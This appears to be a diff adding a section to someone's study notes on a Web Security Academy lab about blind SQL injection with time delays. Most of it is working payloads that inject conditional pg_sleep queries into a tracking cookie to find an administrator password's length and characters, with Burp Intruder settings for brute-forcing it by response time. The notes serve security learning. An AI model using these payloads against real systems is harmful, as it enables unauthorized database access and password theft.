@@ -116,3 +116,44 @@ The SQL query on the srv might look like this
 SELECT userid FROM tracking where id='${trackingId}'
 ```
 
+## Blind SQL injection with time delays and information retrieval
+
+```
+# Initial Request
+GET / HTTP/2
+Host: 0a6700fe046f338e812f434f00f40045.web-security-academy.net
+Cookie: TrackingId=f3a7cn7ioKyEbnQz; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+
+# Initial check for execution (works)
+Cookie: TrackingId=f3a7cn7ioKyEbnQz'|| pg_sleep(3) --; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+
+# First Condition: Remeber we are already in a select statement
+Cookie: TrackingId=f3a7cn7ioKyEbnQz' || CASE WHEN ('1'='1') THEN pg_sleep(3) ELSE pg_sleep(0) END--; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+
+# Our first actual succefull data retrevial Request
+Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN LENGTH(password) < 30 
+THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE 
+username='administrator')-- ; 
+
+# PW Length is 20
+Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN LENGTH(password) = 20 THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- ; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+
+
+# Test of PW char 1 1
+Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN (substring(password,1,1) > 'a') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users WHERE username='administrator' limit 1)-- ; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+
+# Intruder
+Cookie: TrackingId=f3a7cn7ioKyEbnQz' || (SELECT CASE WHEN substring(password,§1§,1) = '§a§' THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users WHERE username='administrator' limit 1)-- ; session=JzTLeEfQgPeATLOCBhW6lAOT2BSVYcyn
+```
+
+Intruder Settings:
+- cluster bomb
+  - 1. pos = number 1-20
+  - 2. pos = `a-z`, `0-9`
+- set max concurrent connections to 10
+
+- In results: show `Response received`, which is the response time.
+  - Sort by that and read PW
+
+![blind-timing-data](img/blind-timing-data.png)
+
